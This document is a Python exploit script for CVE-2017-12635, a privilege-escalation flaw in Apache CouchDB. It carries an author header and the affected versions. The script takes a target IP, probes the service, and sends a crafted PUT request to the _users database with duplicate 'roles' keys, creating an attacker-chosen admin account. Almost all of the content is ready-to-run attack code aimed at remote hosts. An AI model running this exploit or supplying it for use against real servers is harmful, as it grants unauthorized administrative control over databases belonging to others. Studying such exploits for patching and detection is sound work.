# Date: 2017-08-07
# Exploit Author: Sebasti√°n Castro @r4wd3r
# Vendor Homepage: https://blog.couchdb.org/2017/11/14/apache-couchdb-cve-2017-12635-and-cve-2017-12636/
# Software Link: http://couchdb.apache.org/
# Version: Apache CouchDB 1.7.0 and 2.x before 2.1.1
# CVE : CVE-2017-12635
 
#!/usr/bin/env python
 
import argparse
import re
import sys
import requests
 
parser = argparse.ArgumentParser(
    description=&#039;Exploits the Apache CouchDB JSON Remote Privilege Escalation Vulnerability&#039; +
    &#039; (CVE-2017-12635)&#039;)
parser.add_argument(&#039;host&#039;, help=&#039;Host to attack.&#039;, type=str)
parser.add_argument(&#039;-p&#039;, &#039;--port&#039;, help=&#039;Port of CouchDB Service&#039;, type=str, default=&#039;5984&#039;)
parser.add_argument(&#039;-u&#039;, &#039;--user&#039;, help=&#039;Username to create as admin.&#039;,
                    type=str, default=&#039;couchara&#039;)
parser.add_argument(&#039;-P&#039;, &#039;--password&#039;, help=&#039;Password of the created user.&#039;,
                    type=str, default=&#039;couchapass&#039;)
args = parser.parse_args()
 
host = args.host
port = args.port
user = args.user
password = args.password
 
pat_ip = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
if not pat_ip.match(host):
    print "[x] Wrong host. Must be a valid IP address."
    sys.exit(1)
 
print "[+] User to create: " + user
print "[+] Password: " + password
print "[+] Attacking host " + host + " on port " + port
 
url = &#039;http://&#039; + host + &#039;:&#039; + port
 
try:
    rtest = requests.get(url, timeout=10)
except requests.exceptions.Timeout:
    print "[x] Server is taking too long to answer. Exiting."
    sys.exit(1)
except requests.ConnectionError:
    print "[x] Unable to connect to the remote host."
    sys.exit(1)
 
# Payload for creating user
cu_url_payload = url + "/_users/org.couchdb.user:" + user
cu_data_payload = &#039;{"type": "user", "name": "&#039;+user+&#039;", "roles": ["_admin"], "roles": [], "password": "&#039;+password+&#039;"}&#039;
 
try:
    rcu = requests.put(cu_url_payload, data=cu_data_payload)
except requests.exceptions.HTTPError:
    print "[x] ERROR: Unable to create the user on remote host."
    sys.exit(1)
 
if rcu.status_code == 201:
    print "[+] User " + user + " with password " + password + "successfully created."
    sys.exit(0)
else:
    print "[x] ERROR " + rcu.status_code + ": Unable to create the user on remote host."

